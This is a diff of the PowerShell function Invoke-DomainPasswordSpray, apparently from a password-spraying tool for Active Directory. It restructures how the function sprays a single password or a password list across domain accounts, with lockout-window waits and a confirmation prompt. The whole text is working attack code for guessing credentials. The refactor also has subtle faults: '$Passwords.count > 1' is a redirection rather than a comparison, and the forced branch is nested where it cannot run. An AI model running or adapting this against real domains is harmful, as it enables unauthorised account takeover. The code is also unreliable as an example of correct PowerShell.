@@ -176,88 +176,48 @@ function Invoke-DomainPasswordSpray{
     }
 
     # If a single password is selected do this
-    if ($Password)
+    If ($Password)
     {
-        #if no force flag is set we will ask if the user is sure they want to spray
-        if (!$Force)
-        {
-            $title = "Confirm Password Spray"
-            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
-
-            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
-                "Attempts to authenticate 1 time per user in the list."
-
-            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
-                "Cancels the password spray."
-
-            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
-
-            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
-
-            switch ($result)
-            {
-                0 { TestPassword($CurrentDomain, $UserListArray, $Password) }
-                1 {"Cancelling the password spray."}
-            }
-        }
-        #If the force flag is set don't bother asking if we are sure we want to spray.
-        if ($Force)
-        {
-            TestPassword($CurrentDomain, $UserListArray, $Password)
-        }
-
-
-
+        $Passwords = @($Password)
     }
-        # If a password list is selected do this
     ElseIf($PasswordList)
     {
         $Passwords = Get-Content $PasswordList
-        $observation_window = Get-ObservationWindow
-
+    }
+    Else
+    {
+        Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
+        break
+    }
+    If ($Passwords.count > 1)
+    {
         Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
-        Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
-        Write-Host "[*] Setting a $observation_window minute wait in between sprays."
+    }
 
-        #if no force flag is set we will ask if the user is sure they want to spray
-        if (!$Force)
+    $observation_window = Get-ObservationWindow
+
+    Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
+    Write-Host "[*] Setting a $observation_window minute wait in between sprays."
+
+    # if no force flag is set we will ask if the user is sure they want to spray
+    if (!$Force)
+    {
+        $title = "Confirm Password Spray"
+        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
+
+        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
+            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."
+
+        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
+            "Cancels the password spray."
+
+        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
+
+        $result = $host.ui.PromptForChoice($title, $message, $options, 0)
+
+        switch ($result)
         {
-            $title = "Confirm Password Spray"
-            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
-
-            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
-                "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."
-
-            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
-                "Cancels the password spray."
-
-            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
-
-            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
-
-            switch ($result)
-            {
-                0
-                {
-                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
-                    Write-Host "[*] This might take a while depending on the total number of users"
-
-                    ForEach($Password_Item in $Passwords)
-                    {
-                        TestPassword($CurrentDomain, $UserListArray, $Password_Item)
-                    }
-                    Countdown-Timer -Seconds (60*$observation_window)
-
-                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-                    if ($OutFile -ne "")
-                    {
-                        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-                    }
-                }
-                1 {"Cancelling the password spray."}
-            }
-            #if the force flag is set we will not bother asking about proceeding with password spray.
-            if($Force)
+            0
             {
                 Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
                 Write-Host "[*] This might take a while depending on the total number of users"
@@ -265,21 +225,35 @@ function Invoke-DomainPasswordSpray{
                 ForEach($Password_Item in $Passwords)
                 {
                     TestPassword($CurrentDomain, $UserListArray, $Password_Item)
-                    Countdown-Timer -Seconds (60*$observation_window)
                 }
+                Countdown-Timer -Seconds (60*$observation_window)
+
                 Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
                 if ($OutFile -ne "")
                 {
                     Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
                 }
-
             }
+            1 {"Cancelling the password spray."}
         }
-    }
-    Else
-    {
-        Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
-        break
+        #if the force flag is set we will not bother asking about proceeding with password spray.
+        if($Force)
+        {
+            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
+            Write-Host "[*] This might take a while depending on the total number of users"
+
+            ForEach($Password_Item in $Passwords)
+            {
+                TestPassword($CurrentDomain, $UserListArray, $Password_Item)
+                Countdown-Timer -Seconds (60*$observation_window)
+            }
+            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+            if ($OutFile -ne "")
+            {
+                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+            }
+
+        }
     }
 }
 
